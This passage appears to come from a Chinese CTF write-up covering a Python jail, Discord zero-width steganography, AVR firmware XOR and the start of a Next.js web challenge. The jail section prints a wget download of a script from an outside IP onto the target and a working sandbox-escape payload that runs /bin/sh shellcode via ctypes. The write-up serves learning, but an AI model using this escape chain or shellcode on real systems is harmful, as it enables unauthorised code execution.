</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1># file: thread_cred_audit.sh</span>
</span></span><span class=line><span class=cl><span class=c1># 用法：</span>
</span></span><span class=line><span class=cl><span class=c1>#   1) 指定PID:   ./thread_cred_audit.sh 1234</span>
</span></span><span class=line><span class=cl><span class=c1>#   2) 指定模式:   ./thread_cred_audit.sh &#34;python3 .*jail\.py&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#   3) 默认尝试:   自动搜索 &#34;python3 .*jail.py&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> -euo pipefail
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cyan<span class=o>()</span>  <span class=o>{</span> <span class=nb>printf</span> <span class=s2>&#34;\033[36m%s\033[0m\n&#34;</span> <span class=s2>&#34;</span><span class=nv>$*</span><span class=s2>&#34;</span><span class=p>;</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>yellow<span class=o>(){</span> <span class=nb>printf</span> <span class=s2>&#34;\033[33m%s\033[0m\n&#34;</span> <span class=s2>&#34;</span><span class=nv>$*</span><span class=s2>&#34;</span><span class=p>;</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>red<span class=o>()</span>   <span class=o>{</span> <span class=nb>printf</span> <span class=s2>&#34;\033[31m%s\033[0m\n&#34;</span> <span class=s2>&#34;</span><span class=nv>$*</span><span class=s2>&#34;</span><span class=p>;</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>bold<span class=o>()</span>  <span class=o>{</span> <span class=nb>printf</span> <span class=s2>&#34;\033[1m%s\033[0m\n&#34;</span>   <span class=s2>&#34;</span><span class=nv>$*</span><span class=s2>&#34;</span><span class=p>;</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pick_pid<span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=nb>local</span> <span class=nv>arg</span><span class=o>=</span><span class=s2>&#34;</span><span class=si>${</span><span class=nv>1</span><span class=k>:-</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=nb>local</span> <span class=nv>pid</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=o>[[</span> -n <span class=s2>&#34;</span><span class=nv>$arg</span><span class=s2>&#34;</span> <span class=o>&amp;&amp;</span> <span class=s2>&#34;</span><span class=nv>$arg</span><span class=s2>&#34;</span> <span class=o>=</span>~ ^<span class=o>[</span>0-9<span class=o>]</span>+$ <span class=o>&amp;&amp;</span> -e <span class=s2>&#34;/proc/</span><span class=nv>$arg</span><span class=s2>&#34;</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nv>pid</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$arg</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=k>elif</span> <span class=o>[[</span> -n <span class=s2>&#34;</span><span class=nv>$arg</span><span class=s2>&#34;</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=c1># 通过模式找</span>
</span></span><span class=line><span class=cl>    <span class=nb>local</span> line
</span></span><span class=line><span class=cl>    <span class=nv>line</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>pgrep -af <span class=s2>&#34;</span><span class=nv>$arg</span><span class=s2>&#34;</span> <span class=p>|</span> head -n1 <span class=o>||</span> <span class=nb>true</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[[</span> -n <span class=s2>&#34;</span><span class=nv>$line</span><span class=s2>&#34;</span> <span class=o>]]</span> <span class=o>&amp;&amp;</span> <span class=nv>pid</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>awk <span class=s1>&#39;{print $1}&#39;</span> <span class=o>&lt;&lt;&lt;</span><span class=s2>&#34;</span><span class=nv>$line</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=c1># 默认找 jail.py</span>
</span></span><span class=line><span class=cl>    <span class=nb>local</span> line
</span></span><span class=line><span class=cl>    <span class=nv>line</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>pgrep -af <span class=s1>&#39;python3 .*jail\.py&#39;</span> <span class=p>|</span> head -n1 <span class=o>||</span> <span class=nb>true</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[[</span> -n <span class=s2>&#34;</span><span class=nv>$line</span><span class=s2>&#34;</span> <span class=o>]]</span> <span class=o>&amp;&amp;</span> <span class=nv>pid</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>awk <span class=s1>&#39;{print $1}&#39;</span> <span class=o>&lt;&lt;&lt;</span><span class=s2>&#34;</span><span class=nv>$line</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=k>fi</span>
</span></span><span class=line><span class=cl>  <span class=o>[[</span> -z <span class=s2>&#34;</span><span class=nv>$pid</span><span class=s2>&#34;</span> <span class=o>]]</span> <span class=o>&amp;&amp;</span> <span class=o>{</span> red <span class=s2>&#34;未找到目标进程。请传入 PID 或匹配模式。&#34;</span><span class=p>;</span> <span class=nb>exit</span> 1<span class=p>;</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$pid</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>pid</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>pick_pid <span class=s2>&#34;</span><span class=si>${</span><span class=nv>1</span><span class=k>:-</span><span class=si>}</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[[</span> -r <span class=s2>&#34;/proc/</span><span class=nv>$pid</span><span class=s2>/status&#34;</span> <span class=o>]]</span> <span class=o>||</span> <span class=o>{</span> red <span class=s2>&#34;无权读取 /proc/</span><span class=nv>$pid</span><span class=s2>/status（可能被 hidepid 或权限限制）&#34;</span><span class=p>;</span> <span class=nb>exit</span> 1<span class=p>;</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bold <span class=s2>&#34;== 目标进程：PID </span><span class=nv>$pid</span><span class=s2> ==&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>name</span><span class=o>=</span><span class=k>$(</span>awk <span class=s1>&#39;/^Name:/{print $2}&#39;</span> /proc/<span class=nv>$pid</span>/status<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>uidline</span><span class=o>=</span><span class=k>$(</span>awk <span class=s1>&#39;/^Uid:/{print $2,$3,$4,$5}&#39;</span> /proc/<span class=nv>$pid</span>/status<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>gidline</span><span class=o>=</span><span class=k>$(</span>awk <span class=s1>&#39;/^Gid:/{print $2,$3,$4,$5}&#39;</span> /proc/<span class=nv>$pid</span>/status<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>threads</span><span class=o>=</span><span class=k>$(</span>awk <span class=s1>&#39;/^Threads:/{print $2}&#39;</span> /proc/<span class=nv>$pid</span>/status<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Name: </span><span class=nv>$name</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Uid (R/E/S/FS): </span><span class=nv>$uidline</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Gid (R/E/S/FS): </span><span class=nv>$gidline</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Threads: </span><span class=nv>$threads</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bold <span class=s2>&#34;== 线程凭据一览 ==&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s2>&#34;%-8s %-12s %-12s %-8s %-s\n&#34;</span> <span class=s2>&#34;TID&#34;</span> <span class=s2>&#34;Uid(R/E/S)&#34;</span> <span class=s2>&#34;Gid(R/E/S)&#34;</span> <span class=s2>&#34;State&#34;</span> <span class=s2>&#34;Comm&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>declare</span> -A <span class=nv>seen_euids</span><span class=o>=()</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=nv>IFS</span><span class=o>=</span> <span class=nb>read</span> -r d<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>  <span class=nv>tid</span><span class=o>=</span><span class=s2>&#34;</span><span class=si>${</span><span class=nv>d</span><span class=p>##*/</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=nv>st</span><span class=o>=</span><span class=s2>&#34;/proc/</span><span class=nv>$pid</span><span class=s2>/task/</span><span class=nv>$tid</span><span class=s2>/status&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>[[</span> -r <span class=s2>&#34;</span><span class=nv>$st</span><span class=s2>&#34;</span> <span class=o>]]</span> <span class=o>||</span> <span class=k>continue</span>
</span></span><span class=line><span class=cl>  <span class=nb>read</span> ruid euid suid fsuid &lt; &lt;<span class=o>(</span>awk <span class=s1>&#39;/^Uid:/{print $2,$3,$4,$5}&#39;</span> <span class=s2>&#34;</span><span class=nv>$st</span><span class=s2>&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=nb>read</span> rgid egid sgid fsgid &lt; &lt;<span class=o>(</span>awk <span class=s1>&#39;/^Gid:/{print $2,$3,$4,$5}&#39;</span> <span class=s2>&#34;</span><span class=nv>$st</span><span class=s2>&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=nv>state</span><span class=o>=</span><span class=k>$(</span>awk -F<span class=s1>&#39;\t&#39;</span> <span class=s1>&#39;/^State:/{print $2}&#39;</span> <span class=s2>&#34;</span><span class=nv>$st</span><span class=s2>&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>  <span class=nv>comm</span><span class=o>=</span><span class=k>$(</span>awk -F<span class=s1>&#39;\t&#39;</span> <span class=s1>&#39;/^Name:/{print $2}&#39;</span> <span class=s2>&#34;</span><span class=nv>$st</span><span class=s2>&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>  <span class=nb>printf</span> <span class=s2>&#34;%-8s %-12s %-12s %-8s %-s\n&#34;</span> <span class=s2>&#34;</span><span class=nv>$tid</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$ruid</span><span class=s2>/</span><span class=nv>$euid</span><span class=s2>/</span><span class=nv>$suid</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$rgid</span><span class=s2>/</span><span class=nv>$egid</span><span class=s2>/</span><span class=nv>$sgid</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$state</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$comm</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  seen_euids<span class=o>[</span><span class=s2>&#34;</span><span class=nv>$euid</span><span class=s2>&#34;</span><span class=o>]=</span><span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>done</span> &lt; &lt;<span class=o>(</span>ls -1 /proc/<span class=nv>$pid</span>/task<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>((</span> <span class=si>${#</span><span class=nv>seen_euids</span><span class=p>[@]</span><span class=si>}</span> &gt; <span class=m>1</span> <span class=o>))</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>  red <span class=s2>&#34;⚠ 检测到不同的 EUID 存在于同一进程的不同线程中（线程级降权/不一致）——此为题目核心风险点。&#34;</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>  yellow <span class=s2>&#34;未观察到 EUID 差异。但注意：竞态窗口仍可能瞬时存在，单次快照不代表绝对安全。&#34;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></td></tr></table></div></div><p>靶机出网，传上去</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget http://156.238.233.93:9999/1.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nobody@b46f2ce4e8f7:/tmp$ pgrep -af <span class=s1>&#39;python3 .*jail\.py&#39;</span>
</span></span><span class=line><span class=cl>pgrep -af <span class=s1>&#39;python3 .*jail\.py&#39;</span>
</span></span><span class=line><span class=cl><span class=m>1</span> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py
</span></span><span class=line><span class=cl><span class=m>521</span> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py
</span></span><span class=line><span class=cl><span class=m>522</span> python3 /jail.py
</span></span><span class=line><span class=cl>nobody@b46f2ce4e8f7:/tmp$ ./1.sh <span class=m>522</span>
</span></span><span class=line><span class=cl>./1.sh <span class=nv>522</span>
</span></span><span class=line><span class=cl><span class=o>==</span> 目标进程：PID <span class=nv>522</span> <span class=o>==</span>
</span></span><span class=line><span class=cl>Name: python3
</span></span><span class=line><span class=cl>Uid <span class=o>(</span>R/E/S/FS<span class=o>)</span>: <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>Gid <span class=o>(</span>R/E/S/FS<span class=o>)</span>: <span class=m>65534</span> <span class=m>65534</span> <span class=m>65534</span> <span class=m>65534</span>
</span></span><span class=line><span class=cl>Threads: <span class=nv>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>==</span> <span class=nv>线程凭据一览</span> <span class=o>==</span>
</span></span><span class=line><span class=cl>TID      Uid<span class=o>(</span>R/E/S<span class=o>)</span>   Gid<span class=o>(</span>R/E/S<span class=o>)</span>   State    Comm
</span></span><span class=line><span class=cl><span class=m>522</span>      0/0/0        65534/65534/65534 S <span class=o>(</span>sleeping<span class=o>)</span> python3
</span></span><span class=line><span class=cl><span class=m>523</span>      65534/65534/65534 65534/65534/65534 S <span class=o>(</span>sleeping<span class=o>)</span> Thread-1 <span class=o>(</span>safe_
</span></span></code></pre></td></tr></table></div></div><p>同一进程不同线程用shellcode打 <a href="https://ewontfix.com/17/#:~:text=Now">https://ewontfix.com/17/#:~:text=Now</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>()</span>.__class__.__base__.__subclasses__<span class=o>()[</span>166<span class=o>]</span>.__init__.__globals__<span class=o>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=o>][</span><span class=s1>&#39;exec&#39;</span><span class=o>](</span><span class=s2>&#34;ctypes=__import__(&#39;ctypes&#39;);m=__import__(&#39;o&#39;+&#39;s&#39;);libc=ctypes.CDLL(None);PROT_READ,PROT_WRITE,PROT_EXEC=1,2,4;MAP_PRIVATE,MAP_ANONYMOUS=2,32;SIGUSR1=10;SYS_TGKILL=234;size=0x1000;mm=libc.mmap;mm.restype=ctypes.c_void_p;addr=mm(0,size,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);sc=b&#39;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&#39;;ctypes.memmove(addr,sc,len(sc));CB=ctypes.CFUNCTYPE(None,ctypes.c_int);handler=ctypes.cast(addr,CB);libc.signal.argtypes=(ctypes.c_int,CB);libc.signal.restype=CB;libc.signal(SIGUSR1,handler);pid=m.getpid();libc.syscall(SYS_TGKILL,pid,pid,SIGUSR1)&#34;</span>,<span class=o>()</span>.__class__.__base__.__subclasses__<span class=o>()[</span>166<span class=o>]</span>.__init__.__globals__<span class=o>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=o>])</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=discord-shenanigans-v5>DISCORD SHENANIGANS V5</h2><p>根据题目描述，确定在dc的官方频道的announcement处藏了东西</p><p>所以直接将当时有的一些记录复制到notepad，发现其中一条信息后有奇怪的内容</p><p><img src=/img/2025-TFCCTF/10.png alt=1></p><p>推测应该是零宽字节隐写，这里丢给厨子可以看到只有两种零宽字节，用在线工具处理不出来</p><p>gpt搞个脚本解析一下即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 将你的十六进制字符串放进来，用空格分开</span>
</span></span><span class=line><span class=cl><span class=n>hex_string</span> <span class=o>=</span> <span class=s2>&#34;20 e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8b e2 80 8b e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8b e2 80 8c e2 80 8c e2 80 8b e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8c e2 80 8b e2 80 8c&#34;</span>  <span class=c1># 省略部分</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 转成 bytes</span>
</span></span><span class=line><span class=cl><span class=n>bytes_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>hex_string</span><span class=o>.</span><span class=n>split</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 解码成 Unicode 字符</span>
</span></span><span class=line><span class=cl><span class=n>text</span> <span class=o>=</span> <span class=n>bytes_data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 建立零宽字符映射：\u200B -&gt; &#39;0&#39;, \u200C -&gt; &#39;1&#39;</span>
</span></span><span class=line><span class=cl><span class=n>mapping</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;</span><span class=se>\u200B</span><span class=s1>&#39;</span><span class=p>:</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\u200C</span><span class=s1>&#39;</span><span class=p>:</span> <span class=s1>&#39;1&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 转换成二进制字符串</span>
</span></span><span class=line><span class=cl><span class=n>binary_str</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>mapping</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 按每8位分割并转换为 ASCII</span>
</span></span><span class=line><span class=cl><span class=n>chars</span> <span class=o>=</span> <span class=p>[</span><span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>binary_str</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>],</span> <span class=mi>2</span><span class=p>))</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>binary_str</span><span class=p>),</span> <span class=mi>8</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>chars</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;提取结果:&#34;</span><span class=p>,</span> <span class=n>result</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=blackbox>BLACKBOX</h2><p>固件分析，丢ida，发现是avr架构</p><p>ida没办法直接解析反汇编成伪代码</p><p>但由于这固件内容不多，可以直接分析有的内容，发现sub_BE是核心代码</p><p>ai分析发现是进行了简单的异或加密，异或0xa5，但是不确定密文的位置在哪里，直接把整个elf文件作为输入丢给赛博厨子，然后得到flag</p><p><img src=/img/2025-TFCCTF/11.png alt=1></p><h2 id=cr00ney>CR00NEY</h2><p>题目附件代码看起来比较多, 但是关键逻辑就几点</p><ol><li>/app/api/admin/route.js 是获取flag的地方 对应路由/api/admin</li><li>注册登录</li><li>从给定的sftp服务器下载文件到本地, 并返回文件中的内容. 题目默认在本地开了一个sftp, 因此可以下载文件, 包括sqlite的.db文件并查看内容</li></ol><p>获取flag的地方</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>user</span> <span class=o>||</span> <span class=o>!</span><span class=nx>user</span><span class=p>.</span><span class=nx>admin</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>NextResponse</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Forbidden&#39;</span> <span class=p>},</span> <span class=p>{</span> <span class=nx>status</span><span class=o>:</span> <span class=mi>403</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>ADMIN_FLAG</span> <span class=o>||</span> <span class=s1>&#39;No flag set&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>NextResponse</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>flag</span> <span class=p>});</span>
</span></span></code></pre></td></tr></table></div></div><p>需要admin字段鉴权以确定是都能拿到flag, 去看users表结构</p><p><img src=/img/2025-TFCCTF/12.png alt=1></p><p>再看注册逻辑</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>export</span> <span class=kr>async</span> <span class=kd>function</span> <span class=nx>POST</span><span class=p>(</span><span class=nx>request</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=p>{</span> <span class=nx>username</span><span class=p>,</span> <span class=nx>password</span> <span class=p>}</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>request</span><span class=p>.</span><span class=nx>json</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>username</span> <span class=o>||</span> <span class=o>!</span><span class=nx>password</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>NextResponse</span><span class=p>.</span><span class=nx>json</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Missing username or password&#39;</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span> <span class=nx>status</span><span class=o>:</span> <span class=mi>400</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>await</span> <span class=nx>initDb</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>db</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>openDb</span><span class=p>();</span>
